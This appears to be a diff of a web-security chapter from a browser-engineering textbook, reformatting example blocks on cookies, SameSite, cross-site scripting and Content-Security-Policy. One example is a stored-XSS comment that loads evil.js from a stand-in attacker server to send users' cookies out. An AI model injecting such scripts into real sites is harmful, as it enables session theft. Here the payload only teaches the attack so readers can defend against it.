@@ -47,17 +47,17 @@ Here are the technical details. An HTTP response can contain a
 example, the following header sets the value of the `foo` cookie to
 `bar`:
 
-::: {.example}
-    Set-Cookie: foo=bar
-:::
+``` {.example}
+Set-Cookie: foo=bar
+```
     
 The browser remembers this key-value pair, and the next time it makes
 a request to the same server (cookies are site-specific), the browser
 echoes it back in the `Cookie` header:
 
-::: {.example}
-    Cookie: foo=bar
-:::
+``` {.example}
+Cookie: foo=bar
+```
 
 Servers can also set multiple cookies and also set parameters like
 expiration dates, but this `Set-Cookie` / `Cookie` mechanism is the
@@ -790,9 +790,9 @@ will not send them in cross-site form submissions.[^in-progress]
 
 A cookie is marked `SameSite` in the `Set-Cookie` header like this:
 
-::: {.example}
-    Set-Cookie: foo=bar; SameSite=Lax
-:::
+``` {.example}
+Set-Cookie: foo=bar; SameSite=Lax
+```
 
 The `SameSite` attribute can take the value `Lax`, `Strict`, or
 `None`, and as I write, browsers have and plan different defaults. Our
@@ -981,16 +981,16 @@ Note that `entry` can be anything, including anything the user might
 stick into our comment form. That includes HTML tags, like a custom
 `<script>` tag! So, a malicious user could post this comment:
 
-::: {.example}
-    Hi! <script src="http://my-server/evil.js"></script>
-:::
+``` {.html .example}
+Hi! <script src="http://my-server/evil.js"></script>
+```
 
 The server would then output this HTML:
 
-::: {.example}
-    <p>Hi! <script src="http://my-server/evil.js"></script>
-    <i>by crashoverride</i></p>
-:::
+``` {.html .example}
+<p>Hi! <script src="http://my-server/evil.js"></script>
+<i>by crashoverride</i></p>
+```
 
 Every user's browser would then download and run the `evil.js` script,
 which can send[^document-cookie][^cross-domain][^how-send] the cookies
@@ -1067,9 +1067,9 @@ specification for this header is quite complex, but in the simplest
 case, the header is set to the keyword `default-src` followed by a
 space-separated list of servers:
 
-::: {.example}
-    Content-Security-Policy: default-src http://example.org
-:::
+``` {.example}
+Content-Security-Policy: default-src http://example.org
+```
 
 This header asks the browser not to load any resources (including CSS,
 JavaScript, images, and so on) except from the listed origins. If our
